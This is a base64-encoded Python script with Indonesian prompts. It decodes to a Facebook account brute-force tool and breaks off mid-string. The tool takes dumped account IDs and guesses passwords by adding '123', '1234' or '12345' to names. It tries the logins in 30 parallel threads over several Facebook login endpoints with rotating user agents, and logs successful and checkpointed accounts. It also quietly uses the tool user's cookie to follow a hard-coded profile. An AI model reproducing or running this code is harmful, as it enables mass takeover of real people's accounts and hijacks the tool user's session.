ZXhpdCAoIlx4MWJbMTs5MW3igKIgRXJyb3IgIikgDQogICAgZWxpZiBfcm9tel8gaW4oIjIiLCIwMiIpOg0KICAgICAgICB0cnk6DQogICAgICAgIAl1YV8gPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKTtqZWRhKDIpO3ByaW50ICgiJXMlcyVzIHVzZXIgYWdlbnQgYW5kYSVzIDogJXMlcyIlKFUsdGlsLE8sTSxILHVhXykpO2plZGEoMik7cmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJdWFfID0gJyVzLSclKE0pDQogICAgZWxpZiBfcm9tel8gaW4oIjAiLCIwMCIpOg0KICAgIAltZW51KCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAoJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCkpO2plZGEoMik7dWFzKF9yb216XykNCiMgU1RBUlQgQ1JBQ0sNCmRlZiBDb21iaW5hdGluKHRleHQpOg0KCWZvciB3IGluIHRleHQuc3BsaXQoIiAiKToNCgkJaWYgbGVuKHcpPDM6DQoJCQljb250aW51ZQ0KCQllbHNlOg0KCQkJdz13Lmxvd2VyKCkNCgkJCWlmIGxlbih3KT09MyBvciBsZW4odyk9PTQgb3IgbGVuKHcpPT01Og0KCQkJCXB3eCA9IFt3KycxMjMnLHcrJzEyMzQnLHcrJzEyMzQ1Jyx3LHRleHQubG93ZXIoKV0NCgkJCWVsc2U6DQoJCQkJcHd4ID0gW3crJzEyMycsdysnMTIzNCcsdysnMTIzNDUnLHddDQoJcmV0dXJuIHB3eA0KZGVmIGlrdXRpX2d3KGt1a2lzKToNCgl0cnk6DQoJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCQlrdWVoICA9IHsiY29va2llIjprdWtpc30NCgkJcj1wYXJzZXIoc2VzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MSIsY29va2llcz1rdWVoKS50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWZvciBpa3V0IGluIHIuZmluZF9hbGwoImEiKToNCgkJCWlmICJCZXJoZW50aSBtZW5naWt1dGkiIGluIHN0cihpa3V0KToNCgkJ""CQlicmVhaw0KCQkJZWxpZiAiSWt1dGkiIGluIHN0cihpa3V0KToNCgkJCQlzZXMuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2lrdXRbImhyZWYiXSxjb29raWVzPWt1ZWgpDQoJZXhjZXB0OiBwYXNzDQpwd3ggPSBbXQ0KY2xhc3MgbmdlbnRvZDoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZCA9IFtdDQogICAgICAgIHNlbGYub3BzaV9jID0gW10NCiAgICAgICAgc2VsZi5nbSA9IFtdDQogICAgICAgIHNlbGYudWJhaF9wYXNzID0gW10NCiAgICAgICAgc2VsZi5wd2JhcnUgPSBbXQ0KICAgICAgICBzZWxmLnVnZW4gPSBbXQ0KICAgICAgICBzZWxmLnB3QmFydSA9IFtdDQogICAgICAgIHNlbGYudXJsID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSINCiAgICANCiAgICBkZWYgdWJhaHB3KHNlbGYpOg0KCQlwdz1yYXdfaW5wdXQoIiVzJXMlcyB1YmFoIHNhbmRpIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCgkJaWYgcHcgaW5bJyddOg0KCQkJcHJpbnQoIiVz4oCiIGlzaSB5ZyBiZW5hciBrZW50b2QgIiUoTSkpDQoJCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCQlzZWxmLnViYWhfcGFzcy5hcHBlbmQoInViYWgiKQ0KCQkJcHcyPXJhd19pbnB1dCgiJXMlcyVzIG1hc3VrYW4gc2FuZGkgJXM+ICVzIiUoVSx0aWwsTyxNLEspKTtwcmludCcnDQoJCQlpZiBsZW4ocHcyKSA8PSA1Og0KCQkJCWV4aXQoIiVz4oCiIHNhbmRpIG1pbmltYWwgNiBrYXJha3RlciAiJShNKSkNCgkJCWVsc2U6DQoJCQkJc2VsZi5wd2JhcnUuYXBwZW5kKHB3MikNCgkJZWxzZToNCgkJCXBhc3MNCiAgICANCiAgICBkZWYgb3BzaV9jcihzZWxmKToNCiAgICAJamFsYW4gKCJcbiVz4oCiICVzbXVuY3Vsa2FuIG9wc2kgY2hlY2twb2ludCByYXdhbiBzcGFtIGhhbCB5YW5nIHdhamFyIGppa2EgaGFzaWwgbnlhIHNlZGlraXQiJShVLE8pKQ0KICAgIAlvcCA9IHJhd19pbnB1dCgnXG4lc+KAoiVzIGd1bmFrYW4gb3BzaSBjaGVja3BvaW50PyB5L3QlcyA+ICVzJyUoVSxPLE0sSykpDQogICAgICAgIGlmIG9wID09Jyc6DQogICAgICAgIAlwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLm9wc2lfY3IoKQ0KICAgICAgICBlbGlmIG9wIGluWydZJywneSddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJtdW5jdWwiKQ0KICAgICAgICAJc2VsZi51YmFocHcoKQ0KICAgICAgICBlbGlmIG9wIGluWyd0JywnVCddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJna19tdW5jdWwiKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgdWFfcmFuKHNlbGYpOg0KICAgIAlvcCA9IHJhd19pbnB1dCgnJXPigKIlcyBpbmdpbiBndW5ha2FuIHVhIHJhbmRvbT8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiBvcCA9""PScnOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICAgICAgZWxpZiBvcCBpblsnWScsJ3knXToNCiAgICAgICAgCXNlbGYudWdlbi5hcHBlbmQoInJhbmRvbSIpDQogICAgICAgIGVsaWYgb3AgaW5bJ3QnLCdUJ106DQogICAgICAgIAlzZWxmLnVnZW4uYXBwZW5kKCJna19yYW5kb20iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgcm9taXkoc2VsZik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGphbGFuICgiXG4lc+KAoiAlc3NlYmVsdW0gY3JhY2sgYW5kYSB3YWppYiBkdW1wIGlkIHRlcmxlYmloIGRhaHVsdSBwaWxpaCBhbnRhcmEgbWVudSAlczEtNiIlKFUsTyxQKSkNCiAgICAgICAgICAgIHNlbGYuYXBrID0gcmF3X2lucHV0KCdcbiVz4oCiJXMgZmlsZSBkdW1wICVzPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICAgICAgc2VsZi5pZCA9IG9wZW4oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIlcyBqdW1sYWggSWQlcyA+ICVzJXMnICUoVSxPLE0sSCxsZW4oc2VsZi5pZCkpKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgRmlsZSBkdW1wIHRpZGFrIGFkYSwgZHVtcCBpZCBkdWx1IGtlbnRvZCclKE0pKQ0KICAgICAgICAgICAgcmF3X2lucHV0KCdcbiVz4oCiICVzWyAlc2VudGVyICVzXSAnJShVLE8sVSxPKSk7bWVudSgpDQogICAgICAgIHNlbGYub3BzaV9jcigpDQogICAgICAgIHNlbGYudWFfcmFuKCkNCiAgICAgICAgdW5pa2VycyA9IHJhd19pbnB1dCgnJXPigKIlcyBndW5ha2FuIHBhc3N3b3JkIG1hbnVhbD8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiB1bmlrZXJzIGluICgnWScsICd5Jyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIlcyBjb250b2glcyA+JXMgc2F5YW5nJXMsJXNwZW5nZW4lcywlc25nZW50b3QnJShVLE8sTSxPLE0sTyxNLE8pKQ0KICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICBwd3ggPSByYXdfaW5wdXQoJyVz4oCiJXMgcGFzc3dvcmQgJXM+ICVzJyUoVSxPLE0sSykpDQogICAgICAgICAgICAgICAgaWYgcHd4ID09ICcnOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgamFuZ2FuIGtvc29uZyAnJShNKSkNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihwd3gpPD01Og0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgcGFzc3dvcmQgbWluaW1hbCA2IGthcmFrdGVyJyUoTSkpO2V4aXQoKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGRlZiBtYW51YWwoYnJ1dGU9Tm9uZSk6DQogICAgICAgICAgICAgICAgICAgICAgICBpbmQgPSByYXdfaW5wdXQoJ1xuJXMjJXMgUGlsaWggJXM+""JXMgJyUoUCxPLE0sSykpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpbmQgPT0gJyc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7bWFudWFsKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgaW5kIGluICgnMScsICcwMScpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFrdW4gaW4gc2VsZi5pZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfaGVja18gPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5iX2FwaSwgX2hlY2tfLCBicnV0ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBpbmQgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRo""IFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYWt1biBpbiBzZWxmLmlkOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9oZWNrXyA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2ljLCBfaGVja18sIGJydXRlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGluZCBpbiAoJzMnLCAnMDMnKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBha3VuIGluIHNlbGYuaWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2hlY2tfID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYubW9iaWwsIF9oZWNrXywgYnJ1dGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCclKE0pKTttYW51YWwoKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIl""cyBbICVzcGlsaWggbWV0aG9kZSBsb2dpbiwgc2lsYWhrYW4gY29iYSBzYXR1wrIgJXNdXG4nJShVLE8sVSxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAxJXMgbWV0aG9kZSAlc2ItYXBpICVzKGNlcGF0KSAnJShVLFAsTyxNLE8pKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDIlcyBtZXRob2RlICVzbWJhc2ljICVzKGxhbWJhdCkgJyUoVSxQLE8sUCxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAzJXMgbWV0aG9kZSAlc21vYmlsZSAlcyhsYW1iYXQpICVzUHJvJyUoVSxQLE8sSCxPLEgpKQ0KICAgICAgICAgICAgICAgICAgICBtYW51YWwocHd4LnNwbGl0KCcsJykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgdW5pa2VycyBpbiAoJ1QnLCAndCcpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiJXMgWyAlc3BpbGloIG1ldGhvZGUgbG9naW4sIHNpbGFoa2FuIGNvYmEgc2F0dcKyJXMgXVxuJyUoVSxPLFUsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDElcyBtZXRob2RlICVzYi1hcGkgJXMoY2VwYXQpJyUoVSxQLE8sTSxPKSkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIgJXMwMiVzIG1ldGhvZGUgJXNtYmFzaWMgJXMobGFtYmF0KSclKFUsUCxPLFAsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDMlcyBtZXRob2RlICVzbW9iaWxlICVzKGxhbWJhdCkgJXNQcm8nJShVLFAsTyxILE8sSCkpDQogICAgICAgICAgICBzZWxmLmxhbmdzdW5nKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCIlc+KAoiBJc2kgeWFuZyBiZW5hciBrZW50b2QgIiUoTSkpO2plZGEoMik7bWVudSgpDQogICAgIyBMQU5HU1VORw0KICAgIGRlZiBsYW5nc3VuZyhzZWxmKToNCiAgICAJZ2xvYmFsIHB3eA0KICAgICAgICBzdXV1ID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiVzICclKFAsTyxNLEspKQ0KICAgICAgICBpZiBzdXV1ID09ICcnOg0KICAgICAgICAgICAgcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5sYW5nc3VuZygpDQogICAgICAgIGVsaWYgc3V1dSBpbiAoJzEnLCAnMDEnKToNCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtl""cnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgIAlmb3IgYWt1biBpbiBzZWxmLmlkOiANCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICBwdyA9IGFrdW4uc3BsaXQoJzw9PicpWzFdDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdyBpbiBwdy5zcGxpdCgiICIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih3KTwzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXc9dy5sb3dlcigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXB3eCA9IENvbWJpbmF0aW4ocHcpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYuYl9hcGksIHVzZXIsIHB3eCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICBlbGlmIHN1dXUgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAJZm9yIGFrdW4gaW4gc2VsZi5pZDogDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXIgPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHcgPSBha3VuLnNwbGl0KCc8PT4nKVsxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHcgaW4gcHcuc3BsaXQoIiAiKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odyk8MzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAl3PXcubG93ZXIoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAlwd3ggPSBDb21iaW5hdGluKHB3KQ0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2lj""LCB1c2VyLCBwd3gpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgZWxpZiBzdXV1IGluICgnMycsICcwMycpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgCWZvciBha3VuIGluIHNlbGYuaWQ6IA0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHB3ID0gYWt1bi5zcGxpdCgnPD0+JylbMV0NCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB3IGluIHB3LnNwbGl0KCIgIik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHcpPDM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJdz13Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJcHd4ID0gQ29tYmluYXRpbihwdykNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5tb2JpbCwgdXNlciwgcHd4KQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLmxhbmdzdW5nKCkNCiAgICMgQl9BUEkNCiAgICBkZWYgYl9hcGkoc2VsZiwgdXNlciwgbWFudWFsKToNCiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAgICAgZm9yIHB3IGluIG1hbnVhbDoNCiAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQ0KICAgICAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICB1YV9waSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkg""QXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuM